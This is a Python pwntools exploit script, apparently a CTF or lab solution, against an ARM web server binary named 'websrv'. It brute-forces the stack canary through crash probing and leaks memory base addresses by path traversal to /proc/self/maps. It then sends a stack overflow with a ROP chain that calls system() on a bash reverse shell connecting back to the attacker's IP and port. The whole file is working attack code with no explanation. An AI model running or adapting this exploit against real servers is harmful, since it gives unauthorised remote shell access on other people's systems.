#!/usr/bin/env python2

from pwn import *

REMOTE = "192.168.100.2"
LOCAL = "192.168.100.254"
LOCAL_PORT = 5555

def bruteforce_canary():
    pre_pad = cyclic(0x1000 - 40)

    cookie = ""
    for i in range(4):
        for i in range(0, 256):
            crashed = crash(pre_pad + cookie + p8(i))
            if not crashed:
                cookie += p8(i)
                break

    print "[+] brutefroce cookie: ", cookie.encode("hex")
    assert(not crash(pre_pad + cookie))

    return cookie

def request(payload, io, path="/"):
    pad = "GET " + path + " HTTP/1.1\r\nContent-Length: " 
    pad += str(len(payload)) + "\r\n\r\n" + payload
    io.send(pad)
    io.readuntil("Content-Length: ")
    num = io.readuntil("\r").strip()


def crash(payload):
    crashed = False
    io = remote("192.168.100.2", 80)
    try:
        request(payload, io)
        request("A", io)
    except:
        crashed = True

    io.close()
    return crashed

def leak_libc_base(pre_pad, io):
    payload = pre_pad
    payload += "$" * (0x2c - 4)

    rop = ROP(binary)
    rop.puts(binary.got["memcpy"])
    print rop.dump()

    payload += rop.chain()
    io.send(payload)
    data = io.recvrepeat(timeout=1)
    print len(data)
    print data.encode("hex")

def leak(io, path="../../../proc/self/maps"):
    request("AAAA", io, path)
    data = io.recvrepeat(0.2)
    data = data.split("\n")
    for item in data:
        if "libc" in item:
            libc_base = item.split("-")[0]
            break

    for item in data:
        if "websrv" in item:
            bin_base = item.split("-")[0]
            break

    for item in data:
        if "stack" in item:
            stack_base = item.split("-")[0]
            break

    libc_base = int(libc_base, 16)
    bin_base = int(bin_base, 16)
    stack_base = int(stack_base, 16)
    
    return bin_base, libc_base, stack_base

if __name__ == "__main__":
    binary = ELF("./websrv")
    libc = ELF("./libc.so.6")

    context.arch = "arm"
    context.log_level = "error"
    cookie = bruteforce_canary()
    print "[+] Get cookie: ", cookie.encode("hex")

    context.log_level = "info"

    io = remote(REMOTE, 80)
    bin_base, libc_base, stack_base = leak(io)
    print "[+] leak: bin_base 0x%x libc_base 0x%x, stack_base 0x%x " \
            %( bin_base, libc_base, stack_base)
    
    binary.address = bin_base
    libc.address = libc_base

    command = "; bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\x00" % (LOCAL, LOCAL_PORT)
    payload = command.rjust(0x1000, "A")
    payload += cookie
    payload += cyclic(cyclic_find(p32(0x6161616a)))


    rop = ROP(binary)
    rop.call(libc.symbols["system"], (stack_base + 0x20000 + 0x580,))
    print rop.dump()
    print rop.chain().encode("hex") 
    
    payload += rop.chain()
    io.send(payload)
    
    io.close()
